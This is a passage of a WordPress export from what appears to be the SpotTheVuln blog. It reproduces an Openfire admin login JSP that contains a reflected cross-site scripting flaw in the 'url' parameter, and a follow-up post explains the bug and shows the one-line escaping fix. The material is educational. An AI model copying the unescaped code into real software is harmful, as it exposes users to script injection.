			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Drop Top</title>
		<link>http://spotthevuln.com/2010/07/drop-top/</link>
		<pubDate>Mon, 12 Jul 2010 15:00:18 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=938</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>However living better now, Gucci sweater now.  Drop top BM's, I'm the man girlfriend</strong>
<strong> -Biggie Smalls
</strong></blockquote>
[ccnLe_java]

&lt;%!
static String go(String url) {
if (url == null) {
return "index.jsp";
}
else {
return url;
}
}
%&gt;

&lt;%-- Check if in setup mode --%&gt;
&lt;%
if (admin.isSetupMode()) {
response.sendRedirect("setup/index.jsp");
return;
}
%&gt;

&lt;% // get parameters
String username = ParamUtils.getParameter(request, "username");
if (username != null) {
username = JID.escapeNode(username);
}
// Escape HTML tags in username to prevent cross-site scripting attacks. This
// is necessary because we display the username in the page below.
username = org.jivesoftware.util.StringUtils.escapeHTMLTags(username);

String password = ParamUtils.getParameter(request, "password");
String url = ParamUtils.getParameter(request, "url");

// SSO between cluster nodes
String secret = ParamUtils.getParameter(request, "secret");
String nodeID = ParamUtils.getParameter(request, "nodeID");
String nonce = ParamUtils.getParameter(request, "nonce");

// The user auth token:
AuthToken authToken;

... SNIP ...
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;&lt;%= AdminConsole.getAppName() %&gt; &lt;fmt:message key="login.title" /&gt;&lt;/title&gt;
&lt;script language="JavaScript" type="text/javascript"&gt;
&lt;!--
// break out of frames
if (self.parent.frames.length != 0) {
self.parent.location=document.location;
}
function updateFields(el) {
if (el.checked) {
document.loginForm.username.disabled = true;
document.loginForm.password.disabled = true;
}
else {
document.loginForm.username.disabled = false;
document.loginForm.password.disabled = false;
document.loginForm.username.focus();
}
}
//--&gt;
&lt;/script&gt;
&lt;link rel="stylesheet" href="style/global.css" type="text/css"&gt;
&lt;link rel="stylesheet" href="style/login.css" type="text/css"&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;form action="login.jsp" name="loginForm" method="post"&gt;

&lt;%  if (url != null) { try { %&gt;

&lt;input type="hidden" name="url" value="&lt;%= url %&gt;"&gt;

&lt;%  } catch (Exception e) { Log.error(e); } } %&gt;

&lt;input type="hidden" name="login" value="true"&gt;

&lt;div align="center"&gt;
&lt;!-- BEGIN login box --&gt;
&lt;div id="jive-loginBox"&gt;

&lt;div align="center" id="jive-loginTable"&gt;

&lt;span id="jive-login-header" style="background: transparent url(images/login_logo.gif) no-repeat left; padding: 29px 0 10px 205px;"&gt;
&lt;fmt:message key="admin.console" /&gt;
&lt;/span&gt;

&lt;div style="text-align: center; width: 380px;"&gt;
&lt;table cellpadding="0" cellspacing="0" border="0" align="center"&gt;
&lt;tr&gt;
&lt;td align="right" class="loginFormTable"&gt;

&lt;table cellpadding="2" cellspacing="0" border="0"&gt;
&lt;noscript&gt;
&lt;tr&gt;
&lt;td colspan="3"&gt;
&lt;table cellpadding="0" cellspacing="0" border="0"&gt;
&lt;tr valign="top"&gt;
&lt;td&gt;&lt;img src="images/error-16x16.gif" width="16" height="16" border="0" alt="" vspace="2"&gt;&lt;/td&gt;
&lt;td&gt;&lt;div class="jive-error-text" style="padding-left:5px; color:#cc0000;"&gt;&lt;fmt:message key="login.error" /&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/noscript&gt;
&lt;%  if (errors.size() &gt; 0) { %&gt;
&lt;tr&gt;
&lt;td colspan="3"&gt;
&lt;table cellpadding="0" cellspacing="0" border="0"&gt;
&lt;% for (String error:errors.values()) { %&gt;
&lt;tr valign="top"&gt;
&lt;td&gt;&lt;img src="images/error-16x16.gif" width="16" height="16" border="0" alt="" vspace="2"&gt;&lt;/td&gt;
&lt;td&gt;&lt;div class="jive-error-text" style="padding-left:5px; color:#cc0000;"&gt;&lt;%= error%&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;% } %&gt;
&lt;/table&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;%  } %&gt;
&lt;tr&gt;
&lt;td&gt;&lt;input type="text" name="username" size="15" maxlength="50" id="u01" value="&lt;%= (username != null ? username : "") %&gt;"&gt;&lt;/td&gt;
&lt;td&gt;&lt;input type="password" name="password" size="15" maxlength="50" id="p01"&gt;&lt;/td&gt;
&lt;td align="center"&gt;&lt;input type="submit" value="&amp;nbsp; &lt;fmt:message key="login.login" /&gt; &amp;nbsp;"&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr valign="top"&gt;
&lt;td class="jive-login-label"&gt;&lt;label for="u01"&gt;&lt;fmt:message key="login.username" /&gt;&lt;/label&gt;&lt;/td&gt;
&lt;td class="jive-login-label"&gt;&lt;label for="p01"&gt;&lt;fmt:message key="login.password" /&gt;&lt;/label&gt;&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="right"&gt;
&lt;div align="right" id="jive-loginVersion"&gt;
&lt;%= AdminConsole.getAppName() %&gt;, &lt;fmt:message key="login.version" /&gt;: &lt;%= AdminConsole.getVersionString() %&gt;
&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;!-- END login box --&gt;
&lt;/div&gt;

&lt;/form&gt;

&lt;script language="JavaScript" type="text/javascript"&gt;
&lt;!--
if (document.loginForm.username.value == '')  {
document.loginForm.username.focus();
} else {
document.loginForm.password.focus();
}
//--&gt;
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;

[/ccnLe_java]
<div id="_mcePaste" style="position: absolute; left: -10000px; top: 0px; width: 1px; height: 1px; overflow: hidden;">&lt;%--
-    $RCSfile$
-    $Revision: 10667 $
-    $Date: 2008-07-14 14:14:29 -0500 (Mon, 14 Jul2008) $
--%&gt;

&lt;%@ page import="org.jivesoftware.admin.AdminConsole,

org.jivesoftware.openfire.admin.AdminManager"
errorPage="error.jsp"
%&gt;
&lt;%@ page

import="org.jivesoftware.openfire.clearspace.Clearspa

ceManager"%&gt;
&lt;%@ page

import="org.jivesoftware.openfire.cluster.ClusterMana

ger" %&gt;
&lt;%@ page

import="org.jivesoftware.openfire.container.AdminCons

olePlugin" %&gt;
&lt;%@ page import="org.xmpp.packet.JID" %&gt;
&lt;%@ page import="org.jivesoftware.openfire.auth.*" %&gt;
&lt;%@ page import="java.util.HashMap" %&gt;
&lt;%@ page import="java.util.Map" %&gt;
&lt;%@ page import="org.jivesoftware.util.*" %&gt;

&lt;%@ taglib uri="http://java.sun.com/jstl/core_rt"

prefix="c" %&gt;
&lt;%@ taglib uri="http://java.sun.com/jstl/fmt_rt"

prefix="fmt" %&gt;

&lt;%-- Define Administration Bean --%&gt;
&lt;jsp:useBean id="admin"

class="org.jivesoftware.util.WebManager"  /&gt;
&lt;% admin.init(request, response, session,

application, out ); %&gt;

&lt;%!
static String go(String url) {
if (url == null) {
return "index.jsp";
}
else {
return url;
}
}
%&gt;

&lt;%-- Check if in setup mode --%&gt;
&lt;%
if (admin.isSetupMode()) {
response.sendRedirect("setup/index.jsp");
return;
}
%&gt;

&lt;% // get parameters
String username = ParamUtils.getParameter

(request, "username");
if (username != null) {
username = JID.escapeNode(username);
}
// Escape HTML tags in username to prevent

cross-site scripting attacks. This
// is necessary because we display the username

in the page below.
username =

org.jivesoftware.util.StringUtils.escapeHTMLTags

(username);

String password = ParamUtils.getParameter

(request, "password");
String url = ParamUtils.getParameter(request,

"url");

// SSO between cluster nodes
String secret = ParamUtils.getParameter(request,

"secret");
String nodeID = ParamUtils.getParameter(request,

"nodeID");
String nonce = ParamUtils.getParameter(request,

"nonce");

// The user auth token:
AuthToken authToken;

// Check the request/response for a login token

Map&lt;String, String&gt; errors = new HashMap&lt;String,

String&gt;();

if (ParamUtils.getBooleanParameter(request,

"login")) {
try {
if (!AdminManager.getInstance

().isUserAdmin(username, true)) {
throw new UnauthorizedException("User

'" + username + "' not allowed to login.");
}
if (secret != null &amp;&amp; nodeID != null) {
if (StringUtils.hash

(AdminConsolePlugin.secret).equals(secret) &amp;&amp;

ClusterManager.isClusterMember(Base64.decode(nodeID,

Base64.URL_SAFE))) {
authToken = new AuthToken

(username);
}
else if ("clearspace".equals(nodeID)

&amp;&amp; ClearspaceManager.isEnabled()) {
ClearspaceManager csmanager =

ClearspaceManager.getInstance();
String sharedSecret =

csmanager.getSharedSecret();
if (nonce == null || sharedSecret

== null || !csmanager.isValidNonce(nonce) ||
!StringUtils.hash

(username + ":" + sharedSecret + ":" + nonce).equals

(secret)) {
throw new

UnauthorizedException("SSO failed. Invalid secret was

provided");
}
authToken = new AuthToken

(username);
}
else {
throw new UnauthorizedException

("SSO failed. Invalid secret or node ID was

provided");
}
}
else {
authToken = AuthFactory.authenticate

(username, password);
}
session.setAttribute

("jive.admin.authToken", authToken);
response.sendRedirect(go(url));
return;
}
catch (ConnectionException ue) {
Log.debug(ue);
if (ClearspaceManager.isEnabled()) {
if (session.getAttribute

("prelogin.setup.error.firstTime.connection") !=

null) {
session.removeAttribute

("prelogin.setup.error.firstTime.connection");
session.setAttribute

("prelogin.setup.error",

"prelogin.setup.error.clearspace.connection");
session.setAttribute

("prelogin.setup.sidebar", "true");
session.setAttribute

("prelogin.setup.sidebar.title",

"prelogin.setup.sidebar.title.clearspace");
session.setAttribute

("prelogin.setup.sidebar.link", "clearspace-

integration-prelogin.jsp");
response.sendRedirect(go

("setup/clearspace-integration-prelogin.jsp"));
} else {
session.setAttribute

("prelogin.setup.error.firstTime.connection", true);
errors.put("connection",

LocaleUtils.getLocalizedString

("login.failed.connection.clearspace"));
}
} else {
errors.put("connection",

LocaleUtils.getLocalizedString

("login.failed.connection"));
}
}
catch (InternalUnauthenticatedException ue) {
Log.debug(ue);
if (ClearspaceManager.isEnabled()) {
if (session.getAttribute

("prelogin.setup.error.firstTime.sharedsecret") !=

null) {
session.removeAttribute

("prelogin.setup.error.firstTime.sharedsecret");
session.setAttribute

("prelogin.setup.error",

"prelogin.setup.error.clearspace.sharedsecret");
session.setAttribute

("prelogin.setup.sidebar", "true");
session.setAttribute

("prelogin.setup.sidebar.title",

"prelogin.setup.sidebar.title.clearspace");
session.setAttribute

("prelogin.setup.sidebar.link", "clearspace-

integration-prelogin.jsp");
response.sendRedirect(go

("setup/clearspace-integration-prelogin.jsp"));
} else {
session.setAttribute

("prelogin.setup.error.firstTime.sharedsecret",

true);
errors.put("authentication",

LocaleUtils.getLocalizedString

("login.failed.authentication.clearspace"));
}
} else {
errors.put("authentication",

LocaleUtils.getLocalizedString

("login.failed.authentication"));
}
}
catch (UnauthorizedException ue) {
Log.debug(ue);
errors.put("unauthorized",

LocaleUtils.getLocalizedString

("login.failed.unauthorized"));
}
}
%&gt;

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01

Transitional//EN"&gt;

&lt;html&gt;
&lt;head&gt;
&lt;title&gt;&lt;%= AdminConsole.getAppName() %&gt;

&lt;fmt:message key="login.title" /&gt;&lt;/title&gt;
&lt;script language="JavaScript"

type="text/javascript"&gt;
&lt;!--
// break out of frames
if (self.parent.frames.length != 0) {

self.parent.location=document.location;
}
function updateFields(el) {
if (el.checked) {
document.loginForm.username.disabled

= true;
document.loginForm.password.disabled

= true;
}
else {
document.loginForm.username.disabled

= false;
document.loginForm.password.disabled

= false;
document.loginForm.username.focus();
}
}
//--&gt;
&lt;/script&gt;
&lt;link rel="stylesheet" href="style/global.css"

type="text/css"&gt;
&lt;link rel="stylesheet" href="style/login.css"

type="text/css"&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;form action="login.jsp" name="loginForm"

method="post"&gt;

&lt;%  if (url != null) { try { %&gt;

&lt;input type="hidden" name="url" value="&lt;%= url

%&gt;"&gt;

&lt;%  } catch (Exception e) { Log.error(e); } } %&gt;

&lt;input type="hidden" name="login" value="true"&gt;

&lt;div align="center"&gt;
&lt;!-- BEGIN login box --&gt;
&lt;div id="jive-loginBox"&gt;

&lt;div align="center" id="jive-loginTable"&gt;

&lt;span id="jive-login-header"

style="background: transparent url

(images/login_logo.gif) no-repeat left; padding: 29px

0 10px 205px;"&gt;
&lt;fmt:message key="admin.console" /&gt;
&lt;/span&gt;

&lt;div style="text-align: center; width:

380px;"&gt;
&lt;table cellpadding="0" cellspacing="0"

border="0" align="center"&gt;
&lt;tr&gt;
&lt;td align="right"

class="loginFormTable"&gt;

&lt;table cellpadding="2"

cellspacing="0" border="0"&gt;
&lt;noscript&gt;
&lt;tr&gt;
&lt;td colspan="3"&gt;
&lt;table

cellpadding="0" cellspacing="0" border="0"&gt;
&lt;tr valign="top"&gt;
&lt;td&gt;&lt;img

src="images/error-16x16.gif" width="16" height="16"

border="0" alt="" vspace="2"&gt;&lt;/td&gt;
&lt;td&gt;&lt;div

class="jive-error-text" style="padding-left:5px;

color:#cc0000;"&gt;&lt;fmt:message key="login.error"

/&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/noscript&gt;
&lt;%  if (errors.size() &gt; 0) {

%&gt;
&lt;tr&gt;
&lt;td colspan="3"&gt;
&lt;table

cellpadding="0" cellspacing="0" border="0"&gt;
&lt;% for

(String error:errors.values()) { %&gt;
&lt;tr valign="top"&gt;
&lt;td&gt;&lt;img

src="images/error-16x16.gif" width="16" height="16"

border="0" alt="" vspace="2"&gt;&lt;/td&gt;
&lt;td&gt;&lt;div

class="jive-error-text" style="padding-left:5px;

color:#cc0000;"&gt;&lt;%= error%&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;% } %&gt;
&lt;/table&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;%  } %&gt;
&lt;tr&gt;
&lt;td&gt;&lt;input type="text"

name="username" size="15" maxlength="50" id="u01"

value="&lt;%= (username != null ? username : "")

%&gt;"&gt;&lt;/td&gt;
&lt;td&gt;&lt;input

type="password" name="password" size="15"

maxlength="50" id="p01"&gt;&lt;/td&gt;
&lt;td align="center"&gt;&lt;input

type="submit" value="&amp;nbsp; &lt;fmt:message

key="login.login" /&gt; &amp;nbsp;"&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr valign="top"&gt;
&lt;td class="jive-login-

label"&gt;&lt;label for="u01"&gt;&lt;fmt:message

key="login.username" /&gt;&lt;/label&gt;&lt;/td&gt;
&lt;td class="jive-login-

label"&gt;&lt;label for="p01"&gt;&lt;fmt:message

key="login.password" /&gt;&lt;/label&gt;&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="right"&gt;
&lt;div align="right" id="jive-

loginVersion"&gt;
&lt;%= AdminConsole.getAppName()

%&gt;, &lt;fmt:message key="login.version" /&gt;: &lt;%=

AdminConsole.getVersionString() %&gt;
&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;!-- END login box --&gt;
&lt;/div&gt;

&lt;/form&gt;

&lt;script language="JavaScript" type="text/javascript"&gt;
&lt;!--
if (document.loginForm.username.value == '')  {
document.loginForm.username.focus();
} else {
document.loginForm.password.focus();
}
//--&gt;
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;

</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>938</wp:post_id>
		<wp:post_date>2010-07-12 08:00:18</wp:post_date>
		<wp:post_date_gmt>2010-07-12 15:00:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>drop-top</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/c2i13i]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[25e4f2bfba3b3499f17a307f46762573]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Drop Top]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Drop Top]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>569</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Drop Top &#8211; Cross Site Scripting ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/07/drop-top-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-07-16 08:23:49</wp:comment_date>
			<wp:comment_date_gmt>2010-07-16 15:23:49</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Drop Top [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Drop Top - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/07/drop-top-cross-site-scripting/</link>
		<pubDate>Fri, 16 Jul 2010 15:23:40 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=946</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Openfire by Ignite Realtime

Fixed in Version: 3.6.1

Issue Type: XSS

Original Code: <a title="Drop Top" href="http://spotthevuln.com/2010/07/drop-top/" target="_blank">Found   Here</a>
<h2>Description</h2>
This is a straightforward XSS bug that affecting the Admin Console of OpenFire by Ignite Realtime/Jive software.  The code fix is simple, encode a tainted URL variable before using it in markup.  The URL variable is assigned an attacker controlled value here:
<blockquote>String url = ParamUtils.getParameter(request, "url");</blockquote>
And is later used in the HTML markup here:
<blockquote>&lt;input value="&lt;%= url %&gt;"&gt;</blockquote>
The one line fix is to encode the URL parameter, which was done here:
<blockquote>url = org.jivesoftware.util.StringUtils.escapeHTMLTags(url);</blockquote>
Looking through the code, we see that OpenFire had previously fixed an XSS vulnerability just a few lines above in the USERNAME variable.  There is even comment indicating so!  It surprising that the Ignite Realtime/Jive developers missed this one as it is literally two lines below the previous fix.
<blockquote>String username = ParamUtils.getParameter(request, "username");

if (username != null) {

username = JID.escapeNode(username);

}

<span style="color: #ff0000;">// Escape HTML tags in username to prevent cross-site scripting attacks. This</span>

<span style="color: #ff0000;">// is necessary because we display the username in the page below.</span>

username = org.jivesoftware.util.StringUtils.escapeHTMLTags(username);

String password = ParamUtils.getParameter(request, "password");

String url = ParamUtils.getParameter(request, "url");</blockquote>
The assignment of the PASSWORD variable is interesting :)
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;%!

static String go(String url) {

if (url == null) {

return "index.jsp";

}

else {

return url;

}

}

%&gt;

&lt;%-- Check if in setup mode --%&gt;

&lt;%

if (admin.isSetupMode()) {

response.sendRedirect("setup/index.jsp");

return;

}

%&gt;

&lt;% // get parameters

String username = ParamUtils.getParameter(request, "username");

if (username != null) {

username = JID.escapeNode(username);

}

// Escape HTML tags in username to prevent cross-site scripting attacks. This

// is necessary because we display the username in the page below.

username = org.jivesoftware.util.StringUtils.escapeHTMLTags(username);

String password = ParamUtils.getParameter(request, "password");

String url = ParamUtils.getParameter(request, "url");

+   url = org.jivesoftware.util.StringUtils.escapeHTMLTags(url);

// SSO between cluster nodes

String secret = ParamUtils.getParameter(request, "secret");

String nodeID = ParamUtils.getParameter(request, "nodeID");

String nonce = ParamUtils.getParameter(request, "nonce");

// The user auth token:

AuthToken authToken;

... SNIP ...

&lt;html&gt;

&lt;head&gt;

&lt;title&gt;&lt;%= AdminConsole.getAppName() %&gt; &lt;fmt:message key="login.title" /&gt;&lt;/title&gt;

&lt;script language="JavaScript"&gt;

&lt;!--

// break out of frames

if (self.parent.frames.length != 0) {

self.parent.location=document.location;

}

function updateFields(el) {

if (el.checked) {

document.loginForm.username.disabled = true;

document.loginForm.password.disabled = true;

}

else {

document.loginForm.username.disabled = false;

document.loginForm.password.disabled = false;

document.loginForm.username.focus();

}

}

//--&gt;

&lt;/script&gt;

&lt;link rel="stylesheet" href="style/global.css" type="text/css"&gt;

&lt;link rel="stylesheet" href="style/login.css" type="text/css"&gt;

&lt;/head&gt;

&lt;body&gt;

&lt;form action="login.jsp" name="loginForm" method="post"&gt;

&lt;%  if (url != null) { try { %&gt;

&lt;input type="hidden" value="&lt;%= url %&gt;"&gt;

&lt;%  } catch (Exception e) { Log.error(e); } } %&gt;

&lt;input value="true"&gt;

&lt;div align="center"&gt;

&lt;!-- BEGIN login box --&gt;

&lt;div id="jive-loginBox"&gt;

&lt;div align="center"&gt;

&lt;span id="jive-login-header" style="background: transparent url(images/login_logo.gif) no-repeat left; padding: 29px 0 10px 205px;"&gt;

&lt;fmt:message key="admin.console" /&gt;

&lt;/span&gt;

&lt;div style="text-align: center; width: 380px;"&gt;

&lt;table cellpadding="0" cellspacing="0" border="0" align="center"&gt;

&lt;tr&gt;

&lt;td align="right"&gt;

&lt;table cellpadding="2" cellspacing="0" border="0"&gt;

&lt;noscript&gt;

&lt;tr&gt;

&lt;td colspan="3"&gt;

&lt;table cellpadding="0" cellspacing="0" border="0"&gt;

&lt;tr valign="top"&gt;

&lt;td&gt;&lt;img src="images/error-16x16.gif" width="16" height="16" border="0" alt="" vspace="2"&gt;&lt;/td&gt;

&lt;td&gt;&lt;div style="padding-left:5px; color:#cc0000;"&gt;&lt;fmt:message key="login.error" /&gt;&lt;/div&gt;&lt;/td&gt;

&lt;/tr&gt;

&lt;/table&gt;

&lt;/td&gt;

&lt;/tr&gt;

&lt;/noscript&gt;

&lt;%  if (errors.size() &gt; 0) { %&gt;

&lt;tr&gt;

&lt;td colspan="3"&gt;

&lt;table cellpadding="0" cellspacing="0" border="0"&gt;

&lt;% for (String error:errors.values()) { %&gt;

&lt;tr valign="top"&gt;

&lt;td&gt;&lt;img src="images/error-16x16.gif" width="16" height="16" border="0" alt="" vspace="2"&gt;&lt;/td&gt;

&lt;td&gt;&lt;div style="padding-left:5px; color:#cc0000;"&gt;&lt;%= error%&gt;&lt;/div&gt;&lt;/td&gt;

&lt;/tr&gt;

&lt;% } %&gt;

&lt;/table&gt;

&lt;/td&gt;

&lt;/tr&gt;

&lt;%  } %&gt;

&lt;tr&gt;

&lt;td&gt;&lt;input size="15" maxlength="50" value="&lt;%= (username != null ? username : "") %&gt;"&gt;&lt;/td&gt;

&lt;td&gt;&lt;input size="15" maxlength="50"&gt;&lt;/td&gt;

&lt;td align="center"&gt;&lt;input value="&amp;nbsp; &lt;fmt:message key="login.login" /&gt; &amp;nbsp;"&gt;&lt;/td&gt;

&lt;/tr&gt;

&lt;tr valign="top"&gt;

&lt;td&gt;&lt;label for="u01"&gt;&lt;fmt:message key="login.username" /&gt;&lt;/label&gt;&lt;/td&gt;

&lt;td&gt;&lt;label for="p01"&gt;&lt;fmt:message key="login.password" /&gt;&lt;/label&gt;&lt;/td&gt;

&lt;td&gt;&amp;nbsp;&lt;/td&gt;

&lt;/tr&gt;

&lt;/table&gt;

&lt;/td&gt;

&lt;/tr&gt;

&lt;tr&gt;

&lt;td align="right"&gt;

&lt;div align="right"&gt;

&lt;%= AdminConsole.getAppName() %&gt;, &lt;fmt:message key="login.version" /&gt;: &lt;%= AdminConsole.getVersionString() %&gt;

&lt;/div&gt;

&lt;/td&gt;

&lt;/tr&gt;

&lt;/table&gt;

&lt;/div&gt;

&lt;/div&gt;

&lt;/div&gt;

&lt;!-- END login box --&gt;

&lt;/div&gt;

&lt;/form&gt;

&lt;script type="text/javascript"&gt;

&lt;!--

if (document.loginForm.username.value == '')  {

document.loginForm.username.focus();

} else {

document.loginForm.password.focus();

}

//--&gt;

&lt;/script&gt;

&lt;/body&gt;

&lt;/html&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>946</wp:post_id>
		<wp:post_date>2010-07-16 08:23:40</wp:post_date>
		<wp:post_date_gmt>2010-07-16 15:23:40</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>drop-top-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="post_tag" nicename="input-value"><![CDATA[input value]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="jive-software"><![CDATA[jive software]]></category>
		<category domain="post_tag" nicename="jsp"><![CDATA[JSP]]></category>
		<category domain="post_tag" nicename="lt"><![CDATA[lt]]></category>
		<category domain="post_tag" nicename="null-return"><![CDATA[null return]]></category>
		<category domain="category" nicename="openfire"><![CDATA[Openfire]]></category>
		<category domain="post_tag" nicename="openfire"><![CDATA[Openfire]]></category>
		<category domain="post_tag" nicename="request-password"><![CDATA[request password]]></category>
		<category domain="post_tag" nicename="request-url"><![CDATA[request url]]></category>
		<category domain="post_tag" nicename="request-username"><![CDATA[request username]]></category>
		<category domain="post_tag" nicename="return-url"><![CDATA[return url]]></category>
		<category domain="post_tag" nicename="setup-mode"><![CDATA[setup mode]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="static-string"><![CDATA[static string]]></category>
